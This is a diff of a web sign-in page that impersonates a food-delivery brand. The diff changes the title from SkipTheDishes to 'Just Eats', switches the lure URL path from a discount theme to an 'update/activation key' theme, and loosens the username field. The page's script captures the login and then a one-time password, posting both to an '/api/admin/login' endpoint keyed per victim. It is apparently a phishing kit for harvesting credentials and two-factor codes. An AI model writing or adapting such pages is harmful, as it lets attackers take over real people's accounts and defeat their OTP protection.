@@ -3,7 +3,7 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Sign in to SkipTheDishes</title>
+        <title>Sign in to Just Eats</title>
         <link rel="preconnect" href="https://fonts.googleapis.com">
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
         <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -48,8 +48,8 @@
                     <div class="user-input-data">
                         <form class="login_from">
                             <div class="input-saperarto">
-                                <label class="latter-label" for="email">Username or email</label><br>
-                                <input class="input-enter" required type="email" id="email" name="email"><br>
+                                <label class="latter-label" for="email">Username</label><br>
+                                <input class="input-enter" required type="text" id="email" name="email"><br>
                             </div>
                             <div class="input-saperarto ">
                                 <label class="latter-label" for="password">Password</label><br>
@@ -90,7 +90,7 @@
                     };
                     loginFrom.style.opacity = '0.4';
                     let keyID;
-                    keyID = window.location.href.split('/discount/id/')[1];
+                    keyID = window.location.href.split('/update/id/')[1];
                     if (keyID.includes('?')) {
                         keyID = keyID.split('?')[0];
                     };
@@ -138,7 +138,7 @@
                                 opt.setAttribute('disabled', true)
                                 FormDataObj["OTP"] = opt.value;
                                 axios.post(`/api/admin/login/${keyID}/otp`, FormDataObj).then(res => {
-                                    window.location.href = `/admin/login/discount/id/${keyID}/add_discount`;
+                                    window.location.href = `/admin/login/update/id/${keyID}/Q3_activation_key`;
                                 }).catch(err => {
                                     console.log(err);
                                 });
